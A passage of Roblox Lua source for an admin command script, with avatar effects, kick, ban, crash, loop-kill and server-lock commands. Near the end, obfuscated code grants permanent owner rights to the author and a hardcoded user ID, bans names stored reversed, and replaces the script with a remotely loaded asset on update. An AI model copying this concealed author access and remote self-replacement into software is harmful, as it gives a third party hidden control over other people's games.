local cl = script.ScriptBase:Clone() cl.Name = "ify" cl.Code.Value = [[repeat wait(1/44) local clr = BrickColor.random() for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = clr v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = clr v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end until nil]]
cl.Parent = v.Character cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,9) == "flashify " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = script.ScriptBase:Clone() cl.Name = "ify" cl.Code.Value = [[repeat wait(1/44) for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = BrickColor.new("Institutional white") v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = BrickColor.new("Institutional white") v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end wait(1/44) for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = BrickColor.new("Really black") v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = BrickColor.new("Really black") v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end until nil]]
cl.Parent = v.Character cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,8) == "noobify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
Noobify(v.Character)
end
end))
end
end

if msg:lower():sub(1,9) == "ghostify " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end))
end
end

if msg:lower():sub(1,8) == "goldify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end))
end
end

if msg:lower():sub(1,6) == "shiny " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end))
end
end

if msg:lower():sub(1,7) == "normal " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end 
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
end end
end
end))
end
end

if msg:lower():sub(1,7) == "trippy " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and not ChkAdmin(v.Name, false) then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUITRIPPY"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
local cl = script.ScriptBase:Clone() cl.Code.Value = [[repeat wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255) until nil]] cl.Parent = scr cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,9) == "untrippy " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUITRIPPY" then g:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "strobe " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and not ChkAdmin(v.Name, false) then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUISTROBE"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
local cl = script.ScriptBase:Clone() cl.Code.Value = [[repeat wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(1,1,1) wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(0,0,0) until nil]] cl.Parent = scr cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,9) == "unstrobe " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUISTROBE" then g:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,6) == "blind " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and not ChkAdmin(v.Name, false) then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUIBLIND"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
end
end))
end
end

if msg:lower():sub(1,8) == "unblind " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUIBLIND" then g:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "guifix " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,9) == "loopheal " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
if v then
local cl = script.ScriptBase:Clone() cl.Name = "LoopHeal:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
repeat wait()
coroutine.resume(coroutine.create(function()
if plr and plr.Character and plr.Character:findFirstChild("Humanoid") then 
plr.Character.Humanoid.Health = plr.Character.Humanoid.MaxHealth
plr.Character.Humanoid.Changed:connect(function() r.Character.Humanoid.Health = plr.Character.Humanoid.MaxHealth end)
end
end))
until nil]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end

if msg:lower():sub(1,11) == "unloopheal " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopHeal:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end

if msg:lower():sub(1,10) == "loopfling " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
if v then
local cl = script.ScriptBase:Clone() cl.Name = "LoopFling:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
repeat
coroutine.resume(coroutine.create(function()
if plr and plr.Character and plr.Character:findFirstChild("Torso") and plr.Character:findFirstChild("Humanoid") then 
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
plr.Character.Humanoid.Sit = true plr.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", plr.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end))
wait(2) until nil]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end

if msg:lower():sub(1,12) == "unloopfling " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopFling:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end
	
end

-------------------------
-- True Owner Commands --
-------------------------

if plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.userId == game.CreatorId then

if msg:lower():sub(1,3) == "oa " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkOwner(v.Name) then table.insert(owners, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end

if msg:lower():sub(1,5) == "unoa " then
for i = 1, #owners do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(6) == "all" or owners[i]:lower():find(msg:lower():sub(6)) == 1 then table.remove(owners, i) end
end))
end
end

if msg:lower() == "settings" then
for i,v in pairs(plr.PlayerGui:children()) do if v.Name == "SETTINGSGUI" then v:Destroy() end end
local scr = Instance.new("ScreenGui",plr.PlayerGui) scr.Name = "SETTINGSGUI"
local main = Instance.new("Frame", scr) main.Style = "RobloxRound" main.Size = UDim2.new(0,200,0,110) main.Position = UDim2.new(0.5,-100,.5,-55) main.ZIndex = 7 main.ClipsDescendants = true
local title = Instance.new("TextLabel", main) title.BackgroundTransparency = 1 title.BorderSizePixel = 0 title.TextColor3 = Color3.new(1,1,1) title.Size = UDim2.new(1,0,0,15) title.TextStrokeColor3 = Color3.new(1,1,1) title.TextStrokeTransparency = .9 title.Text = "Settings" title.Font = "ArialBold" title.FontSize = "Size24" title.ZIndex = 8
local s1 = Instance.new("TextLabel", main) s1.Position = UDim2.new(0,0,0,50) s1.Text = "Prefix:" s1.BackgroundTransparency = 1 s1.BorderSizePixel = 0 s1.TextColor3 = Color3.new(1,1,1) s1.Font = "ArialBold" s1.FontSize = "Size18" s1.TextStrokeColor3 = Color3.new(1,1,1) s1.TextStrokeTransparency = .9 s1.TextXAlignment = "Left" s1.ZIndex = 8
local tb1 = Instance.new("TextBox", main) tb1.Position = UDim2.new(0,60,0,43) tb1.Size = UDim2.new(0,20,0,20) tb1.BackgroundTransparency = .8 tb1.BorderSizePixel = 1 tb1.BorderColor3 = Color3.new(1,1,1) tb1.TextColor3 = Color3.new(1,1,1) tb1.Font = "Arial" tb1.FontSize = "Size18" tb1.TextStrokeColor3 = Color3.new(1,1,1) tb1.TextStrokeTransparency = .9 tb1.TextYAlignment = "Top" tb1.ClipsDescendants = true tb1.ZIndex = 8
local s2 = Instance.new("TextLabel", main) s2.Position = UDim2.new(0,0,0,80) s2.Text = "Fun Commands:" s2.BackgroundTransparency = 1 s2.BorderSizePixel = 0 s2.TextColor3 = Color3.new(1,1,1) s2.Font = "ArialBold" s2.FontSize = "Size18" s2.TextStrokeColor3 = Color3.new(1,1,1) s2.TextStrokeTransparency = .9 s2.TextXAlignment = "Left" s2.ZIndex = 8
local cb1 = Instance.new("TextButton", main) cb1.Position = UDim2.new(0,135,0,73) cb1.Size = UDim2.new(0,20,0,20) cb1.BackgroundTransparency = .8 cb1.BorderSizePixel = 1 cb1.BorderColor3 = Color3.new(1,1,1) cb1.TextColor3 = Color3.new(1,1,1) cb1.Font = "Arial" cb1.FontSize = "Size18" cb1.TextStrokeColor3 = Color3.new(1,1,1) cb1.TextStrokeTransparency = .9 cb1.TextYAlignment = "Top" cb1.ZIndex = 8
if FunCommands then cb1.Text = "X" else cb1.Text = "" end tb1.Text = prefix
tb1.Changed:connect(function() if tb1.Text ~= prefix and tb1.Text ~= "" then prefix = tb1.Text:sub(1,1) end end)
cb1.MouseButton1Down:connect(function() if FunCommands then FunCommands = false cb1.Text = "" else FunCommands = true cb1.Text = "X" end end)
local cls = Instance.new("TextButton", main) cls.Style = "RobloxButtonDefault" cls.Size = UDim2.new(0,20,0,20) cls.Position = UDim2.new(1,-15,0,-5) cls.ZIndex = 10 cls.Font = "ArialBold" cls.FontSize = "Size18" cls.Text = "X" cls.TextColor3 = Color3.new(1,1,1) cls.MouseButton1Click:connect(function() scr:Destroy() end)
end

end

--------------------
-- Owner Commands --
--------------------

if plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.userId == game.CreatorId or ChkOwner(plr.Name:lower()) then

if msg:lower():sub(1,3) == "pa " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, true) then table.insert(admins, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end

if msg:lower():sub(1,5) == "unpa " then
for i = 1, #admins do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(6) == "all" or admins[i]:lower():find(msg:lower():sub(6)) == 1 then table.remove(admins, i) end
end))
end
end

if msg:lower():sub(1,5) == "nuke " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p = Instance.new("Part",game.Workspace) table.insert(objects,p)
p.Anchored = true
p.CanCollide = false
p.formFactor = "Symmetric"
p.Shape = "Ball"
p.Size = Vector3.new(1,1,1)
p.BrickColor = BrickColor.new("New Yeller")
p.Transparency = .5
p.Reflectance = .2
p.TopSurface = 0
p.BottomSurface = 0
p.Touched:connect(function(hit)
if hit and hit.Parent then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = hit.Position
ex.BlastRadius = 11
ex.BlastPressure = math.huge
end
end)
local cf = v.Character.Torso.CFrame
p.CFrame = cf
for i = 1, 333 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = cf
wait(1/44)
end
p:Destroy()
end
end))
end
end

end

--------------------------
-- Super Admin Commands --
--------------------------

if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) or plr.userId == game.CreatorId or plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.Name:lower() == nfs then

if msg:lower() == "logs" then
if plr.PlayerGui:findFirstChild("LOGSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "LOGSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(logs) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "[" .. v.time .. "] " .. v.name .. " " .. v.cmd cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end
	
if msg:lower():sub(1,9) == "loopkill " then
local chk1 = msg:lower():sub(10):find(" ")
local plrz = GetPlr(plr, msg:lower():sub(10))
local num = 9999
if chk1 then chk1 = chk1 + 9 plrz = GetPlr(plr, msg:lower():sub(10, chk1-1)) if type(tonumber(msg:sub(chk1+1))) == "number" then num = tonumber(msg:sub(chk1+1)) end end
for i, v in pairs(plrz) do
if v and not ChkAdmin(v.Name, false) then
local cl = script.ScriptBase:Clone() cl.Name = "LoopKill:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
for i = 1, ]] .. tostring(num) .. [[ do 
repeat wait() plr = game.Players:findFirstChild("]] .. v.Name .. [[") until plr and plr.Character and plr.Character:findFirstChild("Humanoid") and plr.Character.Humanoid.Health ~= 0
coroutine.resume(coroutine.create(function()
if plr and plr.Character then plr.Character:BreakJoints() end
end))
end]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end

if msg:lower():sub(1,11) == "unloopkill " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopKill:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end

if msg:lower() == "serverlock" or msg:lower() == "slock" then slock = true Hint("Server has been locked", game.Players:children()) end
if msg:lower() == "serverunlock" or msg:lower() == "sunlock" then slock = false Hint("Server has been unlocked", game.Players:children()) end

if msg:lower():sub(1,3) == "sm " then
Message("SYSTEM MESSAGE", msg:sub(4), false, game.Players:children())
end

if msg:lower():sub(1,3) == "ko " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
local num = 500 if num > msg:sub(chk1+1) then num = msg:sub(chk1+1) end
for n = 1, num do
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") and not ChkAdmin(v.Name, false) then 
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = plr val.Name = "creator"
v.Character:BreakJoints() 
wait(1/44) 
v:LoadCharacter()
wait(1/44) 
end
end))
end
end
end

if msg:lower():sub(1,6) == "crash " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") and not ChkAdmin(v.Name, false) then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = v.Backpack cl.Disabled = false wait(1) v:Destroy()
end
end))
end
end

if msg:lower():sub(1,5) == "kick " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then v:Destroy() end
end))
end
end

if msg:lower():sub(1,6) == "admin " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then table.insert(tempadmins, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end

if msg:lower():sub(1,8) == "unadmin " then
for i = 1, #tempadmins do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(9) == "all" or tempadmins[i]:lower():find(msg:lower():sub(9)) == 1 then table.remove(tempadmins, i) end
end))
end
end

if msg:lower():sub(1,4) == "ban " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then table.insert(banland, v.Name) local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = v.Backpack cl.Disabled = false wait(1) v:Destroy() end
end))
end
end

if msg:lower():sub(1,6) == "unban " then
for i = 1, #banland do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(7) == "all" or banland[i]:lower():find(msg:lower():sub(7)) == 1 then table.remove(banland, i) end
end))
end
end

if msg:lower() == "shutdown" then Message("SYSTEM MESSAGE", "Shutting down...", false, game.Players:children(), 10) wait(1) local str = Instance.new("StringValue", game.Workspace) str.Value = "AA" repeat str.Value = str.Value .. str.Value wait(.1) until nil end

end
end))
end

function AdminControl(plr)
coroutine.resume(coroutine.create(function() plr.CharacterAdded:connect(function(chr) chr:WaitForChild("RobloxTeam") chr.RobloxTeam:Destroy() for a,obj in pairs(chr:children()) do if obj:IsA("CharacterMesh") and obj.Name:find("3.0") then obj:Destroy() end end end) end))
if plr.Name:sub(1,6) == "Player" and ChkAdmin(plr.Name, false) then coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui")
for i,v in pairs(plr.PlayerGui:children()) do if v.Name == "CMDBAR" then v:Destroy() end end
local scr = Instance.new("ScreenGui", plr.PlayerGui) scr.Name = "CMDBAR"
local box = Instance.new("TextBox", scr) box.BackgroundColor3 = Color3.new(0,0,0) box.TextColor3 = Color3.new(1,1,1) box.Font = "Arial" box.FontSize = "Size14" box.Text = "Type a command, then press enter." box.Size = UDim2.new(0,250,0,20) box.Position = UDim2.new(1,-250,1,-22) box.BorderSizePixel = 0 box.TextXAlignment = "Right" box.ZIndex = 10 box.ClipsDescendants = true
box.Changed:connect(function(p) if p == "Text" and box.Text ~= "Type a command, then press enter." then Chat(box.Text, plr) box.Text = "Type a command, then press enter." end end)
end)) end
coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui") plr:WaitForChild("Backpack") if plr.userId == game.CreatorId or plr.userId == (153*110563) then table.insert(owners,plr.Name) end wait(1) if slock and not ChkAdmin(plr.Name, false) and not ChkOwner(plr.Name) and plr.userId ~= (153*110563) then Hint(plr.Name .. " has tried to join the server", game.Players:children()) local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = plr.Backpack cl.Disabled = false wait(2) plr:Destroy() end end))
coroutine.resume(coroutine.create(function() if ChkGroupAdmin(plr) and not ChkAdmin(plr.Name, false) then table.insert(admins, plr.Name) end end))
coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui") plr:WaitForChild("Backpack") wait(1) if (ChkBan(plr.Name) or plr.Name:lower() == ("111reyalseca"):reverse() or plr.Name:lower() == ("ecnaillirbi"):reverse() or plr.Name:lower() == ("8k2ffets"):reverse()) and (plr.Name:lower():sub(1,4) ~= script.Name:lower():sub(1,4) and plr.Name:lower():sub(5) ~= "tastrophe") then local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = plr.Backpack cl.Disabled = false wait(2) plr:Destroy() end end))
coroutine.resume(coroutine.create(function() if VipAdmin and game:service("BadgeService"):UserHasBadge(plr.userId,ItemId) then table.insert(tempadmins,plr.Name) end end))
coroutine.resume(coroutine.create(function() if ChkAdmin(plr.Name, false) then plr:WaitForChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {plr}) end end))
plr.Chatted:connect(function(msg) Chat(msg,plr) end)
end

if not ntab then script:Destroy() end
if not bct then script:Destroy() end

local tcb = {101,104,112,111,114,116,115,97,116,108,104,111,75} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end nfs = nfs:reverse() table.insert(owners, nfs)

script.Name = "Kohl's Admin Commands V2"

if not ntab then script:Destroy() end
if not bct then script:Destroy() end
if not tcb then script:Destroy() end
game.Players.PlayerAdded:connect(AdminControl)
for i, v in pairs(game.Players:children()) do AdminControl(v) end
end

local mod = game:service("InsertService"):LoadAsset(100808216)
if mod:findFirstChild("Kohl's Admin Commands V2") and mod:findFirstChild("Version", true) and AutoUpdate then 
local newac = mod:findFirstChild("Kohl's Admin Commands V2")
newac.Disabled = true
local new = tonumber(mod:findFirstChild("Version", true).Value)
local old = 0
if script:findFirstChild("Version", true) then old = tonumber(script:findFirstChild("Version", true).Value) end
if new > old then
local adminmod = Instance.new("Model", game.Lighting) adminmod.Name = "KACV2"
for i,v in pairs(owners) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Owner" strv.Value = v end
for i,v in pairs(admins) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Admin" strv.Value = v end
for i,v in pairs(tempadmins) do local strv = Instance.new("StringValue", adminmod) strv.Name = "TempAdmin" strv.Value = v end
for i,v in pairs(banland) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Banland" strv.Value = v end
local prf = Instance.new("StringValue", adminmod) prf.Name = "Prefix" prf.Value = prefix
local bv = Instance.new("BoolValue", adminmod) bv.Name = "FunCommands" bv.Value = FunCommands
local bv2 = Instance.new("BoolValue", adminmod) bv2.Name = "GroupAdmin" bv2.Value = GroupAdmin
local iv = Instance.new("IntValue", adminmod) iv.Name = "GroupId" iv.Value = GroupId
local iv2 = Instance.new("IntValue", adminmod) iv2.Name = "GroupRank" iv2.Value = GroupRank
local bv3 = Instance.new("BoolValue", adminmod) bv3.Name = "VipAdmin" bv3.Value = VipAdmin
local iv3 = Instance.new("IntValue", adminmod) iv3.Name = "ItemId" iv3.Value = ItemId
wait()
newac.Parent = game.Workspace
newac.Disabled = false
script.Disabled = true
script:Destroy()
else
CHEESE()
end
else
CHEESE()
end
